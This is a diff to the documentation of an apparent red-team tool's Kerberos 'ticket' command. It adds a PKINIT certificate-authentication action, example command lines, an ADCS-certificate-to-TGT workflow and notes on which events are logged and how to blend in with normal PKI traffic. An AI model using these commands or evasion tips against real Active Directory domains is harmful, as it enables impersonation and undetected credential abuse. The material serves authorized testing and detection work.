@@ -7,7 +7,7 @@ hidden = false
 
 ## Summary
 
-Forge, request, renew, or delegate Kerberos tickets using extracted encryption keys.
+Forge, request, renew, delegate, or certificate-auth Kerberos tickets using extracted encryption keys or certificates.
 
 **Forge — Golden Ticket** (T1558.001): Forges a TGT using the `krbtgt` account's encryption key. Pure offline cryptographic operation — no network traffic.
 
@@ -21,13 +21,15 @@ Forge, request, renew, or delegate Kerberos tickets using extracted encryption k
 
 **S4U — Constrained Delegation** (T1134.001): Performs S4U2Self + S4U2Proxy to obtain a service ticket for an impersonated user via constrained delegation. Requires a service account with `msDS-AllowedToDelegateTo` and `TrustedToAuthForDelegation` (protocol transition). Online operation against the KDC.
 
+**PKINIT — Certificate-Based Authentication** (T1649): Performs an AS-REQ with PA-PK-AS-REQ pre-authentication using a client certificate instead of a password/hash. Uses Diffie-Hellman key exchange (IKE Group 2, 1024-bit MODP) and CMS SignedData for proof of possession. Certificates can be obtained from ADCS certificate requests (e.g., via `adcs -action request`) or Shadow Credentials (`msDS-KeyCredentialLink` via `ldap-write`). Online operation against the KDC.
+
 Outputs tickets in kirbi format (for Rubeus/Mimikatz on Windows) or ccache format (for Linux/macOS `KRB5CCNAME`).
 
 ## Arguments
 
 | Argument | Required | Description |
 |----------|----------|-------------|
-| `-action` | Yes | Action: `forge`, `request`, `diamond`, `renew`, or `s4u` |
+| `-action` | Yes | Action: `forge`, `request`, `diamond`, `renew`, `s4u`, or `pkinit` |
 | `-realm` | Yes | Kerberos realm / AD domain (e.g., `CORP.LOCAL`) |
 | `-username` | Yes | Username for the ticket (forge/request/diamond) or service account (s4u) |
 | `-key` | Yes* | Encryption key in hex (from DCSync, hashdump, etc.). *Not needed for renew.* |
@@ -45,6 +47,10 @@ Outputs tickets in kirbi format (for Rubeus/Mimikatz on Windows) or ccache forma
 | `-target_user` | No | Diamond: user identity to embed in modified ticket (defaults to username) |
 | `-target_rid` | No | Diamond: RID for the target user (default: 500) |
 | `-ticket` | No* | Base64 kirbi ticket for renewal. *Required for renew.* |
+| `-certificate` | No* | PEM certificate or file path on target (e.g., `/tmp/cert.pem`). *Required for pkinit (unless pfx is provided).* |
+| `-private_key` | No* | PEM private key or file path on target (RSA PKCS#1/PKCS#8, EC). *Required for pkinit (unless pfx is provided).* |
+| `-pfx` | No* | Base64-encoded PFX/PKCS#12 file or file path on target. *Alternative to certificate+private_key for pkinit.* |
+| `-pfx_password` | No | Password for PFX file (empty string for no password). |
 
 ## Usage
 
@@ -134,6 +140,55 @@ Extend an existing TGT's lifetime without re-authenticating:
 ticket -action renew -realm CORP.LOCAL -server dc01.corp.local -ticket <base64_kirbi_from_previous_request>
 ```
 
+### PKINIT — Certificate-Based TGT
+
+Request a TGT using certificate files on the target:
+
+```
+ticket -action pkinit -realm CORP.LOCAL -username admin -server dc01.corp.local -certificate /tmp/cert.pem -private_key /tmp/key.pem
+```
+
+With ccache output for Linux:
+
+```
+ticket -action pkinit -realm CORP.LOCAL -username admin -server dc01.corp.local -certificate /tmp/cert.pem -private_key /tmp/key.pem -format ccache
+```
+
+With inline PEM content (also supported):
+
+```
+ticket -action pkinit -realm CORP.LOCAL -username admin -server dc01.corp.local -certificate "-----BEGIN CERTIFICATE-----\nMIID...base64...\n-----END CERTIFICATE-----" -private_key "-----BEGIN PRIVATE KEY-----\nMIIE...base64...\n-----END PRIVATE KEY-----"
+```
+
+With PFX/PKCS#12 file (common Windows export format):
+
+```
+ticket -action pkinit -realm CORP.LOCAL -username admin -server dc01.corp.local -pfx /tmp/cert.pfx -pfx_password "MyPassword"
+```
+
+With base64-encoded PFX data (no password):
+
+```
+ticket -action pkinit -realm CORP.LOCAL -username admin -server dc01.corp.local -pfx <base64_pfx_data>
+```
+
+### ADCS + PKINIT Workflow
+
+1. Request a certificate from an ADCS template:
+```
+adcs -action request -server ca01.corp.local -template User -username admin@corp.local -password pass
+```
+
+2. Use the certificate to get a TGT via PKINIT:
+```
+ticket -action pkinit -realm CORP.LOCAL -username admin -server dc01.corp.local -certificate <cert_from_step_1> -private_key <key_from_step_1>
+```
+
+3. Import the ticket:
+```
+klist -action import -ticket <base64_from_step_2>
+```
+
 ### DCSync + OPtH Workflow
 
 1. Extract a user's keys:
@@ -217,6 +272,8 @@ impacket-psexec -k -no-pass corp.local/Administrator@dc01
 **Renew** generates a TGS-REQ with the RENEW flag — produces event ID 4769. Normal renewal traffic blends well with legitimate Kerberos operations.
 
 **S4U** generates TGS-REQ traffic to the KDC (3 requests: AS-REQ for TGT, S4U2Self TGS-REQ, S4U2Proxy TGS-REQ). Produces event ID 4769 for the S4U2Proxy service ticket. The service account must have constrained delegation configured with protocol transition (`TrustedToAuthForDelegation`).
+
+**PKINIT** generates an AS-REQ with PA-PK-AS-REQ padata (type 16) containing a CMS SignedData structure with the client certificate. Event ID 4768 is logged with Certificate Information fields populated (thumbprint, issuer). Smart Card Logon events (4624 type 11) may also fire. The certificate chain is visible in the KDC response — use certificates from legitimate ADCS templates to blend with normal PKI authentication.
 {{% /notice %}}
 
 - AES256 keys are preferred over RC4 — RC4 tickets may trigger alerts in environments monitoring for etype downgrade
@@ -232,3 +289,4 @@ impacket-psexec -k -no-pass corp.local/Administrator@dc01
 - **T1550.002** — Use Alternate Authentication Material: Pass the Hash (Overpass-the-Hash / request)
 - **T1550.001** — Use Alternate Authentication Material: Application Access Token (renew)
 - **T1134.001** — Access Token Manipulation: Token Impersonation/Theft (S4U Constrained Delegation)
+- **T1649** — Steal or Forge Authentication Certificates (PKINIT certificate-based auth)
